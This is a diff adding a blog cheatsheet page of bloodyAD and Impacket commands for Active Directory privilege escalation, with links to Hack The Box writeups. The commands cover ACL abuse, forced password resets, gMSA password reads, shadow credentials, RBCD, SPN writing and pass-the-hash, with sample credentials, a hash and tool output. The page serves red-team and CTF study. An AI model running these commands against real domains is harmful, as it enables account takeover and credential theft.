@@ -1,0 +1,296 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="BloodyAD-Cheatsheet"><a href="#BloodyAD-Cheatsheet" class="headerlink" title="BloodyAD Cheatsheet"></a>BloodyAD Cheatsheet</h1><p>A concise cheatsheet of common <strong>bloodyAD</strong> commands for Active Directory tasks.<br>Replace the variables (<code>$dc</code>, <code>$domain</code>, <code>$username</code>, <code>$password</code>, etc.) with your target values.</p>
+<hr>
+<h2 id="Retrieve-user-information"><a href="#Retrieve-user-information" class="headerlink" title="Retrieve user information"></a>Retrieve user information</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_username</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Add-user-to-group-addmember-allextendedright-genericall"><a href="#Add-user-to-group-addmember-allextendedright-genericall" class="headerlink" title="Add user to group (addmember allextendedright&#x2F;genericall)"></a>Add user to group (addmember allextendedright&#x2F;genericall)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add groupMember <span class="variable">$group_name</span> <span class="variable">$member_to_add</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Change-password"><a href="#Change-password" class="headerlink" title="Change password"></a>Change password</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> password <span class="variable">$target_username</span> <span class="variable">$new_password</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Give-user-GenericAll-rights"><a href="#Give-user-GenericAll-rights" class="headerlink" title="Give user GenericAll rights"></a>Give user GenericAll rights</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add genericAll <span class="string">&quot;<span class="variable">$DN</span>&quot;</span> <span class="variable">$target_username</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Write-owner-WriteOwner"><a href="#Write-owner-WriteOwner" class="headerlink" title="Write owner (WriteOwner)"></a>Write owner (WriteOwner)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> owner <span class="variable">$owner</span> <span class="variable">$target_username</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner &#x27;sam&#x27; -target &#x27;john&#x27; &#x27;tombwatcher.htb&#x27;/&#x27;sam&#x27;    </span><br><span class="line">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies    </span><br><span class="line">  </span><br><span class="line">[*] No credentials supplied, supply password  </span><br><span class="line">Password:  </span><br><span class="line">[*] Current owner information below  </span><br><span class="line">[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105  </span><br><span class="line">[*] - sAMAccountName: sam  </span><br><span class="line">[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb  </span><br><span class="line">[*] OwnerSid modified successfully!</span><br></pre></td></tr></table></figure>
+<h2 id="Read-gMSA-password-msDS-ManagedPassword"><a href="#Read-gMSA-password-msDS-ManagedPassword" class="headerlink" title="Read gMSA password (msDS-ManagedPassword)"></a>Read gMSA password (msDS-ManagedPassword)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_username</span> --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enable-a-disabled-account"><a href="#Enable-a-disabled-account" class="headerlink" title="Enable a disabled account"></a>Enable a disabled account</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> remove uac <span class="variable">$target_username</span> -f ACCOUNTDISABLE</span><br></pre></td></tr></table></figure>
+
+<h2 id="Add-TRUSTED-TO-AUTH-FOR-DELEGATION-flag"><a href="#Add-TRUSTED-TO-AUTH-FOR-DELEGATION-flag" class="headerlink" title="Add TRUSTED_TO_AUTH_FOR_DELEGATION flag"></a>Add TRUSTED_TO_AUTH_FOR_DELEGATION flag</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add uac <span class="variable">$target_username</span> -f TRUSTED_TO_AUTH_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
+
+<h2 id="Modify-UPN"><a href="#Modify-UPN" class="headerlink" title="Modify UPN"></a>Modify UPN</h2><p>Set new UPN:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$old_upn</span> userPrincipalName -v <span class="variable">$new_upn</span></span><br></pre></td></tr></table></figure>
+<p>Check UPN:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_user</span> --attr userPrincipalName</span><br></pre></td></tr></table></figure>
+
+<h2 id="MachineAccountQuota-enumerate"><a href="#MachineAccountQuota-enumerate" class="headerlink" title="MachineAccountQuota (enumerate)"></a>MachineAccountQuota (enumerate)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="string">&#x27;DC=dc,DC=dc&#x27;</span> --attr ms-DS-MachineAccountQuota</span><br></pre></td></tr></table></figure>
+<p>Set MachineAccountQuota to 10:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="string">&#x27;DC=dc,DC=dc&#x27;</span> ms-DS-MachineAccountQuota -v 10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Modify-mail-attribute"><a href="#Modify-mail-attribute" class="headerlink" title="Modify mail attribute"></a>Modify mail attribute</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$target_user</span> mail -v newmail@test.local</span><br></pre></td></tr></table></figure>
+
+<h2 id="Modify-altSecurityIdentities-ESC14B"><a href="#Modify-altSecurityIdentities-ESC14B" class="headerlink" title="Modify altSecurityIdentities (ESC14B)"></a>Modify altSecurityIdentities (ESC14B)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$target_user</span> altSecurityIdentities -v <span class="string">&#x27;X509:&lt;RFC822&gt;user@test.local&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Find-writable-attributes-detailed"><a href="#Find-writable-attributes-detailed" class="headerlink" title="Find writable attributes (detailed)"></a>Find writable attributes (detailed)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get writable --detail</span><br></pre></td></tr></table></figure>
+
+<h2 id="Add-shadowCredentials"><a href="#Add-shadowCredentials" class="headerlink" title="Add shadowCredentials"></a>Add shadowCredentials</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add shadowCredentials <span class="variable">$target</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Write-SPN-servicePrincipalName"><a href="#Write-SPN-servicePrincipalName" class="headerlink" title="Write SPN (servicePrincipalName)"></a>Write SPN (servicePrincipalName)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> <span class="built_in">set</span> object <span class="variable">$target</span> servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Find-deleted-objects-include-deleted"><a href="#Find-deleted-objects-include-deleted" class="headerlink" title="Find deleted objects (include deleted)"></a>Find deleted objects (include deleted)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get writable --include-del</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> bloodyAD <span class="literal">-u</span> Administrator <span class="literal">-d</span> bloody <span class="literal">-p</span> <span class="string">&#x27;Password123!&#x27;</span> <span class="literal">--host</span> <span class="number">192.168</span>.<span class="number">100.3</span> get search <span class="literal">-c</span> <span class="number">1.2</span>.<span class="number">840.113556</span>.<span class="number">1.4</span>.<span class="number">2064</span> <span class="literal">--resolve-sd</span> <span class="literal">--attr</span> ntsecuritydescriptor <span class="literal">--base</span> <span class="string">&#x27;CN=Deleted Objects,DC=bloody,DC=corp&#x27;</span> <span class="literal">--filter</span> <span class="string">&quot;(objectClass=container)&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Extended-search-operations-show-help"><a href="#Extended-search-operations-show-help" class="headerlink" title="Extended search operations (show help)"></a>Extended search operations (show help)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get search -h</span><br></pre></td></tr></table></figure>
+<p>Example: display tombstoned attributes with controls:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use the controls (-c) for additional search behavior</span></span><br><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065</span><br></pre></td></tr></table></figure>
+
+<h2 id="Restore-a-deleted-object"><a href="#Restore-a-deleted-object" class="headerlink" title="Restore a deleted object"></a>Restore a deleted object</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> -k <span class="built_in">set</span> restore <span class="variable">$user_to_restore</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Create-a-new-computer-account"><a href="#Create-a-new-computer-account" class="headerlink" title="Create a new computer account"></a>Create a new computer account</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add computer <span class="variable">$computer_name</span> <span class="variable">$computer_password</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Add-Resource-Based-Constrained-Delegation-RBCD"><a href="#Add-Resource-Based-Constrained-Delegation-RBCD" class="headerlink" title="Add Resource Based Constrained Delegation (RBCD)"></a>Add Resource Based Constrained Delegation (RBCD)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add rbcd <span class="string">&#x27;DELEGATE_TO$&#x27;</span> <span class="string">&#x27;DELEGATE_FROM$&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Notes-tips"><a href="#Notes-tips" class="headerlink" title="Notes &amp; tips"></a>Notes &amp; tips</h2><ul>
+<li>Pass <code>-k</code> to use Kerberos authentication.  </li>
+<li>You can pass a user hash instead of a password using <code>-p :hash</code>.  </li>
+<li>Specify format for <code>--password</code> or <code>-k &lt;keyfile&gt;</code> using <code>-f</code>, e.g. <code>-f rc4</code>.  </li>
+<li>Always verify object DNs and attributes before running modification commands.  </li>
+<li>Use quotes around DNs and values containing spaces or special characters.</li>
+</ul>
+<hr>
+<h2 id="Quick-cheat-sheet-most-used"><a href="#Quick-cheat-sheet-most-used" class="headerlink" title="Quick cheat-sheet (most used)"></a>Quick cheat-sheet (most used)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># enumerate writable attributes</span></span><br><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get writable --detail</span><br><span class="line"></span><br><span class="line"><span class="comment"># add genericAll</span></span><br><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add genericAll <span class="string">&quot;<span class="variable">$DN</span>&quot;</span> <span class="variable">$target_username</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create machine/computer</span></span><br><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> add computer <span class="variable">$computer_name</span> <span class="variable">$computer_password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read gMSA password</span></span><br><span class="line">bloodyAD --host <span class="variable">$dc</span> -d <span class="variable">$domain</span> -u <span class="variable">$username</span> -p <span class="variable">$password</span> get object <span class="variable">$target_username</span> --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">https://github.com/CravateRouge/bloodyAD/wiki/User-Guide</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/03/30/htb-rebound.html">https://0xdf.gitlab.io/2024/03/30/htb-rebound.html</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2025/04/26/htb-vintage.html">https://0xdf.gitlab.io/2025/04/26/htb-vintage.html</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/">https://www.thehacker.recipes/</a></li>
+</ul>
+<hr>
+<p>get writable objects by our current user</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host &lt;domain name&gt; -u firstuser.last -p &quot;&quot; get writable --detail </span><br></pre></td></tr></table></figure>
+
+
+<p>change password for a user ( give force change password permission)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD -d ad.someorg.local --dc-ip 172.16.8.3 -u &#x27;hporter&#x27; -p &#x27;Gr8hambino!&#x27; set password ssmalls &#x27;!aSreksio333&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>bloodyAD with hash NT hash authentication #PTH</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`bloodyAD --host dc.example.local -d EXAMPLE -u someuser -p :2B576ACBE6BCFDA7294D6BD18041B8FE get membership someuser`</span><br></pre></td></tr></table></figure>
+<h2 id="set-command-sets-attributes-for-objects"><a href="#set-command-sets-attributes-for-objects" class="headerlink" title="set command (sets attributes for objects)"></a>set command (sets attributes for objects)</h2><h3 id="add-SPN-To-target-user"><a href="#add-SPN-To-target-user" class="headerlink" title="add SPN To target user"></a>add SPN To target user</h3><p><code>bloodyAD add &lt;attribute&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host DC01.ad.someorg.local -d ad.someorg.local -u mssqladm -p :2B576ACBE6BCFDA7294D6BD18041B8FE add ServicePrincipleName &#x27;ttimmons&#x27; &#x27;MSSQLSvc/server.domain.local:1433&#x27;</span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
